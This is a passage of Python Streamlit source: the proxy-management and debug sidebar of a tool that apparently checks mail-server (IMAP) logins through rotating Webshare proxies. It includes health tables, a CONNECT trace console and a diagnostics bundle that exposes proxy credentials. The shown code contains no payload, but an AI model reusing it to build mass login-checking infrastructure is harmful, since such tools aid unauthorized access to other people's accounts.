                        "itself failed the 443 control - the credential or the plan. "
                        "'407 auth (dest only)' = the node authenticated and only that "
                        "destination was refused, so it keeps its score. '402 plan/"
                        "bandwidth' = the provider is refusing SERVICE on a node that is "
                        "alive and authenticated. A socket reset is separate again, and a "
                        "LOGIN_DROPPED (* BYE) is a MAIL-SERVER event, not a proxy one.")

    _rc1, _rc2, _rc3 = str_lit.columns(3)
    with _rc1:
        if str_lit.button("🔁 Re-probe pool now", width="stretch"):
            clear_tunnel_cache()
            refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)
            str_lit.session_state["_proxy_flash"] = ("success", "Pool re-probed.")
            str_lit.rerun()
    with _rc2:
        if str_lit.button("🧾 Show raw proxies.txt", width="stretch"):
            try:
                with open(CFG["PROXY_FILE"], encoding="utf-8", errors="ignore") as _pf:
                    _lines = [l.rstrip() for l in _pf if l.strip()]
                _uniq = list(dict.fromkeys(_lines))
                str_lit.caption(f"{len(_lines)} line(s), {len(_uniq)} unique, "
                                f"{'CREDS present' if any('@' in l for l in _lines) else 'NO CREDS (@ absent)'}")
                str_lit.code("\n".join(_lines), language="text")
            except Exception as _pf_err:
                str_lit.error(f"Could not read proxies.txt: {_pf_err}")
    with _rc3:
        if str_lit.button("↩️ Restore from proxies_all.txt", width="stretch",
                          help="Fetch & Test writes only the SURVIVORS into proxies.txt. "
                               "This puts the full raw fetched pool back."):
            try:
                _allp = CFG.get("PROXY_ALL_FILE") or "proxies_all.txt"
                if os.path.exists(_allp):
                    with open(_allp, encoding="utf-8", errors="ignore") as _rf:
                        _restore = [l.strip() for l in _rf
                                    if l.strip() and not l.strip().startswith("#")]
                    if _restore:
                        with file_write_lock:
                            with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as _wf:
                                _wf.write("\n".join(_restore) + "\n")
                        clear_tunnel_cache()
                        log_startup(f"proxies.txt restored from proxies_all.txt "
                                    f"({len(_restore)} line(s)).")
                        str_lit.session_state["_proxy_flash"] = (
                            "success",
                            f"Restored {len(_restore)} line(s) from proxies_all.txt.")
                        str_lit.rerun()
                    else:
                        str_lit.session_state["_proxy_flash"] = (
                            "warning", "proxies_all.txt is empty.")
                        str_lit.rerun()
                else:
                    str_lit.session_state["_proxy_flash"] = (
                        "warning", "No proxies_all.txt yet - run Fetch & Test first.")
                    str_lit.rerun()
            except Exception as _rex:
                str_lit.error(f"Restore failed: {_rex}")

    with str_lit.expander("➕ Add Custom Proxies", expanded=False):
        custom_proxy_text = str_lit.text_area(
            "Paste proxies (host:port or user:pass@host:port)",
            placeholder="123.45.67.89:8080", height=100)
        if str_lit.button("Save Custom Proxies"):
            if custom_proxy_text.strip():
                try:
                    new_proxies = [l.strip() for l in custom_proxy_text.splitlines()
                                   if l.strip() and not l.strip().startswith("#")]
                    combined = list(dict.fromkeys(load_proxies() + new_proxies))
                    with file_write_lock:
                        with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                            f.write("\n".join(combined) + "\n")
                    clear_tunnel_cache()
                    log_startup(f"Added {len(new_proxies)} custom proxies successfully.")
                    str_lit.session_state["_proxy_flash"] = (
                        "success", f"Added {len(new_proxies)} custom proxies successfully!")
                    str_lit.rerun()
                except Exception as ex:
                    str_lit.error(f"Error saving custom proxies: {ex}")

    # FIX PERF-7: the blocking st.spinner is gone - block 077 now drives its own
    # progress bar in 24-line chunks, so the sidebar keeps painting instead of
    # freezing for the whole batch budget.
    if str_lit.button("📥 Fetch & Test All Proxies"):
        str_lit.caption("Phase 1 validates at burst width, then phase 2 confirms only "
                        "the ambiguous answers. Both bars move.")
        _n_alive, _n_total = fetch_and_test_all_proxies()
        _msr = STATE.get("mail_spot") or {}
        if _msr.get("user") and _msr.get("user") != _gate_scope():
            _msr = {}
        if _n_alive:
            _msg = (f"✅ **{_n_alive}** node(s) kept from **{_n_total}** line(s), saved "
                    f"and armed. Press 🔥 Start Live Checking Engine.")
            if _msr.get("auth") and not _msr.get("ok"):
                _msg += (f"  🚨 ...but the MAIL-destination spot check 407'd on "
                         f"{_msr['auth']}/{_msr['n']} sampled node(s) against "
                         f"{_msr['host']}:{_msr['port']} - set **Proxy Mode Engine = off** "
                         f"until it resets.")
            elif _msr.get("plan") and not _msr.get("ok"):
                _msg += (f"  ⚠ ...and the MAIL-destination spot check answered 402 on "
                         f"{_msr['plan']}/{_msr['n']} sampled node(s) - alive, out of "
                         f"bandwidth. Set **Proxy Mode Engine = off** until it resets.")
            str_lit.session_state["_proxy_flash"] = ("success", _msg)
        else:
            str_lit.session_state["_proxy_flash"] = (
                "warning", "No node passed validation. Check WEBSHARE_KEYS in secrets.")
        str_lit.rerun()

    # v13.70: A KEYED CHECKBOX, NOT AN EXPANDER. An expander keeps no state, so
    # its body runs on EVERY rerun whether it is open or not - and this body
    # builds four dataframes over the whole pool, from four full dict copies.
    # A checkbox persists, so closed means closed and the cost is only paid
    # while the panel is actually on screen.
    if str_lit.checkbox("📊 Open the Proxy Health & Geo Dashboard", key="ph_open"):
        with probe_stats_lock:
            _pstats = dict(probe_stats)
        # v13.54: SNAPSHOT UNDER THE LOCK. Iterating proxy_meta directly raised
        # RuntimeError: dictionary changed size during iteration whenever the probe
        # thread inserted a node mid-render.
        with proxy_lock:
            _meta_all = dict(proxy_meta)
        try:
            _file_keys = set(all_proxies)
        except Exception:
            _file_keys = set()
        _meta_snap = dict(_meta_all)
        _hidden_snap = {}
        if _file_keys:
            _hidden_snap = {k: v for k, v in _meta_all.items() if k not in _file_keys}
            _meta_snap = {k: v for k, v in _meta_all.items() if k in _file_keys}
        _hidden = len(_hidden_snap)

        # ---- FIX KEY-1: PER-KEY ROLLUP, worst first ------------------------
        # Rolled up by API KEY, over EVERY probed line - not just the ones that
        # survived into proxies.txt, because a key whose whole output was dropped
        # is exactly the key you are looking for and it used to leave no trace
        # here at all.
        _key_roll = {}
        for _kp, _kv in _pstats.items():
            _ki = parse_proxy(_kp)
            _kid = _keymap.get(_kp, -2)
            _kr = (_kv.get("reason") or "?")
            _b = _key_roll.setdefault(_kid, {"n": 0, "pass": 0, "plan": 0,
                                             "auth": 0, "dead": 0,
                                             "ips": set(), "users": set()})
            _b["n"] += 1
            if _kv.get("ok"):
                _b["pass"] += 1
            if _kr in ("auth", "auth_dest"):
                _b["auth"] += 1
            elif _kr == "plan":
                _b["plan"] += 1
            elif _kr in ("timeout", "transport", "tcp", "dead", "format"):
                _b["dead"] += 1
            if _ki:
                _b["ips"].add(_ki["host"])
                _b["users"].add((_ki.get("user") or "").lower())
        if _key_roll:
            _rows_k = []
            for _kid, _b in _key_roll.items():
                if _b["pass"]:
                    _verdict, _act = "OK", ""
                elif _b["plan"] and not _b["dead"]:
                    _verdict = "SPENT - 402 on every line"
                    _act = "keep - bandwidth, recovers on reset"
                elif _b["auth"] and not _b["dead"] and not _b["plan"]:
                    _verdict = "REJECTED - 407 on every line"
                    _act = f"fix the key's user:pass, or delete key {_key_label(_kid)}"
                elif _b["dead"] and not _b["plan"] and not _b["auth"]:
                    _verdict = "DEAD - never answered on any line"
                    _act = f"DELETE key {_key_label(_kid)} in Secrets"
                elif not _b["n"]:
                    _verdict, _act = "NO LINES - key returned nothing", "DELETE this key"
                else:
                    _verdict, _act = "MIXED - see the node table", "inspect below"
                _rows_k.append({
                    "Key #": _key_label(_kid),
                    "Lines": _b["n"],
                    "Passed": _b["pass"],
                    "402 spent": _b["plan"],
                    "407 auth": _b["auth"],
                    "Dead/timeout": _b["dead"],
                    "IPs": len(_b["ips"]),
                    "Sub-users": ", ".join(sorted(u for u in _b["users"] if u)) or "-",
                    "Verdict": _verdict,
                    "Action": _act,
                })
            for _kid in range(len(WEBSHARE_KEYS)):
                if _kid not in _key_roll:
                    _rows_k.append({
                        "Key #": _key_label(_kid), "Lines": 0, "Passed": 0,
                        "402 spent": 0, "407 auth": 0, "Dead/timeout": 0, "IPs": 0,
                        "Sub-users": "-",
                        "Verdict": "NO LINES - key returned nothing",
                        "Action": "DELETE this key in Secrets",
                    })
            _rows_k.sort(key=lambda r: (r["Passed"], -r["Dead/timeout"], -r["Lines"]))
            str_lit.markdown("**Per-key health - worst first**")
            str_lit.caption(
                "One row per API key in WEBSHARE_KEYS. The provider meters a SUB-USER, "
                "so a bad key is a whole key of identical verdicts. A key with **0 "
                "passed** and a Dead/timeout count, or one that returned no lines at "
                "all, is the one to delete from Secrets. A key that is 402 on every "
                "line is only out of bandwidth and comes back on its own.")
            str_lit.dataframe(pd.DataFrame(_rows_k), width="stretch")

        # ---- FIX KEY-1: DEAD ENDPOINTS --------------------------------------
        _ip_roll = {}
        for _ipk, _ipv in _pstats.items():
            _ipi = parse_proxy(_ipk)
            if not _ipi:
                continue
            _b = _ip_roll.setdefault(_ipi["host"], {"n": 0, "pass": 0, "dead": 0,
                                                    "keys": set()})
            _b["n"] += 1
            if _ipv.get("ok"):
                _b["pass"] += 1
            if (_ipv.get("reason") or "") in ("timeout", "transport", "tcp", "dead"):
                _b["dead"] += 1
            _b["keys"].add(_keymap.get(_ipk, -2))
        _dead_ips = {h: b for h, b in _ip_roll.items()
                     if b["pass"] == 0 and b["dead"] >= 1}
        if _dead_ips:
            _rows_i = [{
                "Dead endpoint": _h,
                "Lines": _b["n"],
                "Keys tried": len(_b["keys"]),
                "Never answered": _b["dead"],
                "Action": "remove the host:port line, not the key",
            } for _h, _b in sorted(_dead_ips.items(), key=lambda kv: -kv[1]["dead"])]
            str_lit.markdown("**Dead endpoints - 0 passed, every key**")
            str_lit.caption(
                "These hosts failed on EVERY key, so the key is not the problem - the "
                "IP:port is. Deleting a key would only lose good keys.")
            str_lit.dataframe(pd.DataFrame(_rows_i), width="stretch")

        if _meta_snap:
            rows = []
            for p_str, meta in _meta_snap.items():
                info = parse_proxy(p_str)
                _ps = _pstats.get(p_str) or {}
                if _ps:
                    _rlabel = _PROBE_REASON_LABEL.get(_ps.get("reason", ""),
                                                      _ps.get("reason", ""))
                    _age2 = f"{int(time.time() - _ps.get('ts', time.time()))}s ago"
                    _last = f"{_rlabel} · {_age2}"
                else:
                    _last = "-"
                # FIX UI-6: the Latency column read proxy_meta, which is only ever
                # written on SUCCESS - so every 407 node showed a flat 0 ms. The
                # probe records latency on failure too; read that first.
                _lat = _ps.get("latency_ms", meta.get("latency_ms", 0))
                rows.append({
                    "Key #": _key_label(_key_of(p_str)),
                    "Key": (info.get("user") if info else "") or "",
                    "Proxy": f"{info['host']}:{info['port']}" if info else "Unknown",
                    "Latency": f"{_lat} ms",
                    "Country": meta.get("country", "Unknown"),
                    "Region": meta.get("region", "Unknown"),
                    "Score": meta.get("score", 50),
                    "Fails": meta.get("fails", 0),
                    "Successes": meta.get("success", 0),
                    "407s": _proxy_407.get(p_str, 0),
                    "402s": meta.get("plan", 0),
                    "Parked": "yes" if _proxy_407_parked(p_str) else "",
                    "Attempts": _ps.get("attempts", 0),
                    "Last Probe": _last,
                    "Last Error": (_ps.get("error", "") or "")[:200],
                    "Quarantined": "yes" if proxy_is_quarantined(p_str) else "",
                })
            if _hidden:
                str_lit.caption(f"{len(_meta_snap)} row(s) for the {len(_file_keys)} "
                                f"line(s) in proxies.txt. The other {_hidden} line(s) are "
                                f"in the retired table below.")
            str_lit.caption(
                f"Probe target {CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)} · "
                f"budget {probe_timeout():.0f}s · strict={CFG.get('PROBE_STRICT', True)} · "
                f"dedupe={CFG.get('DEDUPE_PROXIES', True)} · "
                f"max_targets={CFG.get('PROBE_MAX_TARGETS')} · "
                f"scheme2={CFG.get('PROBE_SECOND_SCHEME')} · "
                f"idle_probe={CFG.get('PROBER_IDLE_ENABLED')} · "
                f"mail_spot={CFG.get('MAIL_SPOT_CHECK')}"
            )
            str_lit.dataframe(pd.DataFrame(rows), width="stretch")
            col_ref1, col_ref2, col_ref3, col_ref4 = str_lit.columns(4)
            with col_ref1:
                if str_lit.button("🔄 Refresh Dashboard"):
                    str_lit.rerun()
            with col_ref2:
                if str_lit.button("🔁 Re-probe All"):
                    clear_tunnel_cache()
                    refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)
                    str_lit.session_state["_proxy_flash"] = ("success", "Re-probed.")
                    str_lit.rerun()
            with col_ref3:
                if str_lit.button("🧹 Clean Dead / Low-Score"):
                    with proxy_lock:
                        for k, m in list(proxy_meta.items()):
                            if (m.get("score", 50) < 5 and not m.get("success", 0)) \
                                    or m.get("fails", 0) >= 10:
                                proxy_meta.pop(k, None)
                    save_proxy_meta()
                    str_lit.session_state["_proxy_flash"] = ("success", "Cleaned!")
                    str_lit.rerun()
            with col_ref4:
                if str_lit.button("♻️ Lift 407 Quarantine"):
                    clear_proxy_quarantine()
                    str_lit.session_state["_proxy_flash"] = ("success", "Quarantine lifted.")
                    str_lit.rerun()
        else:
            str_lit.info("No proxy metadata recorded yet.")

        # ---- FIX KEY-1: THE RETIRED TABLE (no row cap) -----------------------
        if _hidden_snap:
            with str_lit.expander(f"🗄 Retired / not-in-pool nodes — {_hidden} line(s) "
                                  f"(probed, not written to proxies.txt)",
                                  expanded=False):
                str_lit.caption(
                    "Fetched lines that did not make the pool: filtered by score or held "
                    "back by the verdict. Read the Key # column - a key that appears here "
                    "on every line and never in the node table is the key to delete.")
                _rows_h = []
                for _hk, _hm in _hidden_snap.items():
                    _hi = parse_proxy(_hk)
                    _hr = (_pstats.get(_hk) or {}).get("reason") or "not probed"
                    _rows_h.append({
                        "Key #": _key_label(_key_of(_hk)),
                        "Key": (_hi.get("user") if _hi else "") or "",
                        "Proxy": f"{_hi['host']}:{_hi['port']}" if _hi else "?",
                        "Verdict": _PROBE_REASON_LABEL.get(_hr, _hr),
                        "Error": ((_pstats.get(_hk) or {}).get("error", "") or "")[:160],
                    })
                _rows_h.sort(key=lambda r: (r["Key #"], r["Proxy"]))
                str_lit.dataframe(pd.DataFrame(_rows_h), width="stretch")

        # v13.55: A DROPPED LINE MUST NOT VANISH SILENTLY. proxies_all.txt
        # holds every fetched line; anything in it that is not in proxies.txt
        # was judged and left out. Read-only: nothing is re-tested.
        _all_path = CFG.get("PROXY_ALL_FILE") or "proxies_all.txt"
        try:
            _all_keys = set()
            if os.path.exists(_all_path):
                with open(_all_path, encoding="utf-8", errors="ignore") as _af:
                    _all_keys = {l.strip() for l in _af
                                 if l.strip() and not l.strip().startswith("#")}
        except Exception as _all_err:
            _all_keys = set()
            log_startup(f"WARNING: could not read proxies_all.txt: {_all_err}")
            str_lit.caption(f"⚠ Could not read proxies_all.txt: {_all_err}")
        _dropped = sorted(_all_keys - _file_keys)
        if _dropped:
            _why = {}
            for _d in _dropped:
                _r = (_pstats.get(_d) or {}).get("reason") or "not probed"
                _why[_r] = _why.get(_r, 0) + 1
            _why_items = sorted(_why.items(), key=lambda kv: -kv[1])
            _why_txt = " · ".join(f"{k} {v}" for k, v in _why_items[:3])
            if len(_why_items) > 3:
                _why_txt += f" · +{len(_why_items) - 3} more"
            with str_lit.expander(f"🚫 Dropped candidates — {len(_dropped)} line(s) "
                                  f"fetched but not in the pool  ({_why_txt})",
                                  expanded=False):
                str_lit.caption(
                    "Judged and left out at the last Fetch & Test. 402 / 407 lines "
                    "are ALIVE and authenticate — they were only set aside because "
                    "another line on the same IP passed. 'Restore from "
                    "proxies_all.txt' puts every one of them back. **Read the Key # "
                    "column** — a key that fills this table is the key to delete.")
                _rows_d = []
                for _d in _dropped:
                    _di = parse_proxy(_d)
                    _dr = (_pstats.get(_d) or {}).get("reason") or "not probed"
                    _rows_d.append({
                        "Key #": _key_label(_key_of(_d)),
                        "Key": (_di.get("user") if _di else "") or "",
                        "Proxy": f"{_di['host']}:{_di['port']}" if _di else "?",
                        "Verdict": _PROBE_REASON_LABEL.get(_dr, _dr),
                        "Error": ((_pstats.get(_d) or {}).get("error", "") or "")[:160],
                    })
                _rows_d.sort(key=lambda r: (r["Key #"], r["Proxy"]))
                str_lit.dataframe(pd.DataFrame(_rows_d), width="stretch")
# @@END 080 PROXY_MGMT_UI

# @@BLOCK 081 PROXY_DEBUG_AND_DIAG_UI deps=014,016,024,026,027,030,052,070,073,080
with str_lit.sidebar:
    # v13.70: keyed checkbox, not an expander - an expander body runs while it is
    # closed, and this one builds the whole diagnostic bundle.
    if str_lit.checkbox("🩺 Open the Proxy Debug Console", key="dbg_open"):
        str_lit.caption(
            "Runs ONE line through a raw CONNECT trace and prints the exact bytes the "
            "proxy sends back, plus the parsed credential fields. Read-only - it does "
            "not touch the pool, the scores or the quarantine."
        )
        str_lit.caption(
            "FIX 407-SCOPE: the target now defaults to the MAIL destination, not the "
            "443 baseline. Trace WITH credentials on the mail target, then on "
            "443 - a 200 on 443 plus a 407 on 993 is a destination refusal and the "
            "node is fine; a 407 on both is the credential or the plan."
        )

        if not all_proxies:
            str_lit.info("No proxy lines loaded - run Fetch & Test first.")
        else:
            # FIX NOLIMIT-1 (v13.59): this was all_proxies[:200], so line 201 of a
            # 3000-line pool could not even be selected.
            _dbg_opts = [f"#{i + 1}  {p[:64]}" for i, p in enumerate(all_proxies)]
            _dbg_sel = str_lit.selectbox(
                "Line to trace", range(len(_dbg_opts)),
                format_func=lambda i: _dbg_opts[i], key="_dbg_sel")
            _dbg_sel = min(_dbg_sel, len(_dbg_opts) - 1)
            _dbg_line = all_proxies[_dbg_sel]

            try:
                _mh0, _mp0 = _mail_spot_target()
                _tgt_def = f"{_mh0}:{_mp0}"
            except Exception:
                _tgt_def = f"{MAIL_SPOT_FALLBACK[0]}:{MAIL_SPOT_FALLBACK[1]}"
            # FIX W-2: seeded, not passed as value= - a keyed widget that also gets a
            # default raises the "created with a default value but also had its value
            # set via the Session State API" warning on every rerun.
            #
            # FIX BTN-1 (v13.57): THE TWO BUTTONS CRASHED THE BLOCK. They were plain
            # st.button widgets that assigned _dbg_target and then called
            # str_lit.rerun() - and on the run where the key already held a value the
            # text_input ABOVE them had already been created, so re-entering the
            # script rebuilt it with a value set through the Session State API and
            # raised StreamlitWidgetAlreadyInstantiatedError, tearing the block down
            # before the trace buttons were even drawn.
            # They are on_click callbacks now: a callback runs BEFORE the script, so
            # the key is already updated when the text_input is created, and no
            # explicit rerun is needed at all. The seed line stays where it was.
            if "_dbg_target" not in str_lit.session_state:
                str_lit.session_state["_dbg_target"] = _tgt_def

            def _dbg_use_mail():
                str_lit.session_state["_dbg_target"] = (
                    f"{MAIL_SPOT_FALLBACK[0]}:{MAIL_SPOT_FALLBACK[1]}")

            def _dbg_use_control():
                str_lit.session_state["_dbg_target"] = (
                    f"{PROBE_CONTROL_TARGETS[0][0]}:{PROBE_CONTROL_TARGETS[0][1]}")

            _dbg_target = str_lit.text_input("CONNECT target (host:port)", key="_dbg_target")
            _bc0a, _bc0b = str_lit.columns(2)
            with _bc0a:
                str_lit.button("✉️ Use the MAIL target", width="stretch",
                               on_click=_dbg_use_mail)
            with _bc0b:
                str_lit.button("🌐 Use the 443 control", width="stretch",
                               on_click=_dbg_use_control)

            # ---- parse audit -------------------------------------------------
            _dp = parse_proxy(_dbg_line)
            _has_at = "@" in _dbg_line
            _n_at = _dbg_line.count("@")
            _man_user, _man_pw = "", ""
            if _has_at:
                _lhs = _dbg_line.rsplit("@", 1)[0]
                if ":" in _lhs:
                    _man_user, _man_pw = _lhs.split(":", 1)

            def _mask(s):
                if not s:
                    return "(EMPTY)"
                if len(s) <= 4:
                    return "*" * len(s)
                return s[:2] + "*" * (len(s) - 4) + s[-2:]

            _RISKY = set("@:/?#[]% ")
            _risky_pw = sorted(set(_man_pw) & _RISKY)
            _risky_user = sorted(set(_man_user) & _RISKY)

            str_lit.code("\n".join([
                f"raw line      : {_dbg_line}",
                f"@ count       : {_n_at}" + ("   <-- WRONG, must be 1" if _n_at != 1 else ""),
                f"parse_proxy() : {'OK' if _dp else 'FAILED -> None'}",
                f"  host        : {(_dp or {}).get('host', '(none)')}",
                f"  port        : {(_dp or {}).get('port', '(none)')}",
                f"  user        : {_man_user or '(none)'}",
                f"  password    : {_mask(_man_pw)}   len={len(_man_pw)}",
                f"risky chars in user     : {_risky_user or 'none'}",
                f"risky chars in password : {_risky_pw or 'none'}",
            ]), language="text")

            if not _has_at:
                str_lit.error("No '@' in the line - it is an IP-auth line, no credentials "
                              "are sent at all. Webshare must be switched off IP "
                              "Authorization and onto Username/Password.")
            elif not _man_pw:
                str_lit.error("Password is EMPTY - the line has user@host:port with no "
                              "colon and password. That produces 407 on every node.")
            elif _risky_pw or _risky_user:
                str_lit.warning("Credential contains characters that break URL parsing "
                                f"({', '.join(sorted(set(_risky_pw) | set(_risky_user)))}). "
                                "URL-encode them in proxies.txt.")

            # ---- trace engine -------------------------------------------------
            def _dbg_connect(host, port, thost, tport, user, pw, mode):
                out = []
                t0 = time.time()
                try:
                    sk = socket.create_connection((host, int(port)), timeout=10)
                except Exception as e:
                    return [f"TCP connect FAILED after {(time.time() - t0) * 1000:.0f} ms "
                            f"-> {type(e).__name__}: {e}"], None
                out.append(f"TCP connect OK in {(time.time() - t0) * 1000:.0f} ms")
                status = None
                try:
                    sk.settimeout(10)
                    hdr = [f"CONNECT {thost}:{tport} HTTP/1.1",
                           f"Host: {thost}:{tport}",
                           "Proxy-Connection: keep-alive"]
                    if mode == "auth" and user and pw:
                        _b64 = base64.b64encode(f"{user}:{pw}".encode()).decode()
                        hdr.append(f"Proxy-Authorization: Basic {_b64}")
                    out.append("--- sent ---")
                    for h in hdr:
                        out.append("  " + (h[:48] + "..."
                                           if h.startswith("Proxy-Authorization") else h))
                    out.append("--- end ---")
                    sk.sendall(("\r\n".join(hdr) + "\r\n\r\n").encode())
                    t1 = time.time()
                    buf = b""
                    while b"\r\n" not in buf and len(buf) < 1024:
                        ch = sk.recv(1024)
                        if not ch:
                            break
                        buf += ch
                    out.append(f"first byte after {(time.time() - t1) * 1000:.0f} ms")
                    first = buf.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                    out.append("--- response ---")
                    out.append(buf[:400].decode("latin-1", "replace").rstrip())
                    out.append("--- end ---")
                    _parts = first.split()
                    if len(_parts) >= 2 and _parts[1].isdigit():
                        status = int(_parts[1])
                except Exception as e:
                    out.append(f"exchange FAILED -> {type(e).__name__}: {e}")
                finally:
                    try:
                        sk.close()
                    except Exception:
                        pass
                return out, status

            def _dbg_verdict(status, sent_creds, target):
                if status is None:
                    return "NO STATUS LINE - connected but the proxy answered nothing."
                if status == 200:
                    return (f"200 AUTH ACCEPTED - proxy and these exact credentials are "
                            f"fine for {target}. If a MAIL target still 407s while this "
                            f"target 200s, the node is good and the provider is refusing "
                            f"the destination - run DIRECT, do not re-fetch the pool.")
                if status == 407:
                    if not sent_creds:
                        return ("407 with NO credentials on the wire - the line carries no "
                                "usable user:pass. Fix proxies.txt, not the app.")
                    return ("407 WITH correct Basic credentials on the wire - the PROVIDER "
                            "is rejecting this exact user:pass. Now trace the SAME line "
                            "against the 443 control: if that also 407s it is the "
                            "credential, the sub-user or the plan; if 443 200s, it is "
                            "only this destination.")
                if status == 403:
                    return (f"403 - the provider refuses this DESTINATION (port or host "
                            f"policy). Webshare blocks 25, 110, 465 and 587 permanently. "
                            f"The node and the credential are both fine.")
                if status in (402, 429, 502, 503):
                    return (f"{status} - proxy reachable but refusing service (plan, "
                            f"bandwidth, concurrency cap or ban), not a credential typo.")
                return f"Unexpected status {status}."

            def _dbg_run(kind):
                thost, _, tport = _dbg_target.rpartition(":")
                tport = int(tport or 993)
                log = [f"=== {kind} | {time.strftime('%H:%M:%S')} ==="]
                if kind == "web-requests":
                    try:
                        import requests as _rq
                        _px = {"http": f"http://{_dbg_line}", "https": f"http://{_dbg_line}"}
                        _t0 = time.time()
                        _rr = _rq.get("https://api.ipify.org", proxies=_px, timeout=15)
                        log.append(f"GET api.ipify.org -> {_rr.status_code} in "
                                   f"{(time.time() - _t0) * 1000:.0f} ms, body={_rr.text[:40]!r}")
                        log.append(_dbg_verdict(_rr.status_code, True, "api.ipify.org:443"))
                    except Exception as e:
                        log.append(f"requests FAILED -> {type(e).__name__}: {e}")
                        log.append("Could not even reach the proxy with requests.")
                    return log
                _mode = "noauth" if kind == "raw-noauth" else "auth"
                if kind == "raw-noauth":
                    _host, _port, _u, _pw = "", "", "", ""
                    _q = parse_proxy(_dbg_line) or {}
                    _host, _port = _q.get("host", ""), _q.get("port", 0)
                else:
                    _q = parse_proxy(_dbg_line) or {}
                    _host, _port = _q.get("host", ""), _q.get("port", 0)
                    _u, _pw = _man_user, _man_pw
                if not _host:
                    return log + ["Could not parse host from the line."]
                lines, status = _dbg_connect(_host, _port, thost, tport, _u, _pw, _mode)
                log.extend(lines)
                log.append("VERDICT: " + _dbg_verdict(status, _mode == "auth",
                                                     f"{thost}:{tport}"))
                return log

            _bc1, _bc2 = str_lit.columns(2)
            with _bc1:
                _go_auth = str_lit.button("▶️ Trace WITH credentials", width="stretch")
                _go_none = str_lit.button("▶️ Trace WITHOUT credentials", width="stretch")
            with _bc2:
                _go_web = str_lit.button("▶️ Web probe (ipify)", width="stretch")
                _go_clear = str_lit.button("🧽 Clear trace log", width="stretch")

            if _go_clear:
                str_lit.session_state["_dbg_log"] = []
            if _go_auth or _go_none or _go_web:
                _kind = ("raw-auth" if _go_auth else
                         "raw-noauth" if _go_none else "web-requests")
                _add = _dbg_run(_kind)
                _log = str_lit.session_state.setdefault("_dbg_log", [])
                _log.extend(_add)
                str_lit.session_state["_dbg_log"] = _log[-600:]

            _show = str_lit.session_state.get("_dbg_log") or []
            if _show:
                str_lit.code("\n".join(_show), language="text")
                str_lit.download_button(
                    "💾 Download trace log", "\n".join(_show),
                    file_name=f"proxy_trace_{int(time.time())}.txt", mime="text/plain")
            else:
                str_lit.caption("No trace yet. Start with **WITH credentials** on line #1.")

# v13.70: keyed checkbox, not an expander. This body builds a bundle of several
# hundred KB and renders it as st.code - on EVERY rerun, while collapsed.
if str_lit.checkbox("🔬 Open Deep Diagnostics (builds the whole bundle)", key="diag_open"):
    str_lit.caption(
        "Everything needed to diagnose the pool remotely. Copy the whole block "
        "(hover it, copy icon) and paste it back. It includes raw proxies.txt lines, "
        "so proxy credentials are visible."
    )

    _dc1, _dc2 = str_lit.columns(2)
    with _dc1:
        if str_lit.button("🔁 Rebuild", width="stretch"):
            STATE["diag_cache"] = {"ts": 0.0, "text": "", "user": ""}
            str_lit.rerun()
    with _dc2:
        if str_lit.button("🧪 Direct self-test", width="stretch"):
            with str_lit.spinner("Running direct self-test..."):
                _probe_target_reachability(force=True)
                _lines = [f"self-test {datetime.now().strftime('%H:%M:%S')}"]
                _lines.extend(_imap_caps_selftest())
                for _raw, _want in (
                    ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
                    ("* BYE Too many simultaneous connections", RETRY_LATER),
                    ("timed out", CONNECTION_FAILED),
                ):
                    try:
                        _got = st_classify(_raw)
                    except Exception as _ce:
                        _got = f"<{_ce}>"
                    _lines.append(f"  classify {_raw[:46]:48} -> {_got} "
                                  f"{'OK' if _got == _want else 'WANTED ' + _want}")
                for r in _probe_target_reachability(force=True):
                    _lines.append(f"  direct {r['target']}: {'OK' if r['ok'] else 'FAIL'} "
                                  f"{r['ms']}ms resolved={r.get('resolved')} {r['err']}")
                if alive_pool:
                    _one = alive_pool[0]
                    _res = tunnel_probe(_one)
                    _lines.append(f"  tunnel via {_one}: ok={_res['ok']} "
                                  f"reason={_res['reason']} lat={_res['latency_ms']}ms "
                                  f"control={_res.get('control', '')} "
                                  f"err={_res.get('error', '')}")
                    _mh, _mp = _mail_spot_target()
                    _mres = tunnel_probe(_one, targets=[(_mh, _mp, "mailspot")],
                                         timeout=MAIL_SPOT_TIMEOUT)
                    _lines.append(f"  MAIL DESTINATION {_mh}:{_mp} via {_one}: "
                                  f"ok={_mres['ok']} reason={_mres['reason']} "
                                  f"control={_mres.get('control', '')} "
                                  f"err={_mres.get('error', '')}")
                    if _mres.get("reason") == "auth_dest":
                        _lines.append("  -> the node authenticated on the control and was "
                                      "refused only by the mail destination. Node is GOOD.")
                else:
                    _lines.append("  tunnel: no alive node to test")
                # FIX ISO-5 (v13.49): selftest is PROCESS state and this text names
                # the alive node and the egress geo, so it was rendering in the
                # OTHER user's expander. Stamp the owner, exactly as diag_cache is.
                STATE["selftest"] = {"ts": time.time(), "text": "\n".join(_lines),
                                     "user": _cache_owner()}
            STATE["diag_cache"] = {"ts": 0.0, "text": "", "user": ""}
            str_lit.success("Self-test done.")

    # FIX P1-3: this used to run on EVERY rerun, inside a COLLAPSED expander -
    # and it reads proxies.txt, walks proxy_meta, probes target reachability,
    # resolves the egress geo and calls socket.getfqdn().  Cache it.
    #
    # v13.48: STATE is process-wide, so that cache was shared across users -
    # raw proxies.txt credentials and the active CFG included - for the whole
    # TTL.  Stamp the owner (block 037) and rebuild on a mismatch, exactly the
    # way the two valid caches are keyed.
    _dcache = STATE.setdefault("diag_cache", {"ts": 0.0, "text": "", "user": ""})
    _dc_who = _cache_owner()
    if ((not _dcache.get("text")) or (_dcache.get("user") != _dc_who)
            or (time.time() - _dcache.get("ts", 0.0)) > DIAG_CACHE_TTL):
        _dcache = {"ts": time.time(), "text": build_diagnostics_text(), "user": _dc_who}
        STATE["diag_cache"] = _dcache
    _diag = _dcache["text"]

    # FIX ISO-5: only show a self-test that belongs to THIS user.
    _st = STATE.get("selftest") or {}
    if _st.get("user") != _cache_owner():
        _st = {}
    if _st.get("text"):
        str_lit.markdown("**Last self-test:**")
        str_lit.code(_st["text"], language="text")

    str_lit.download_button(
        "⬇️ Download bundle", data=_diag,
        file_name=f"diag_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
        mime="text/plain", width="stretch",
    )
    str_lit.code(_diag, language="text")
# @@END 081 PROXY_DEBUG_AND_DIAG_UI

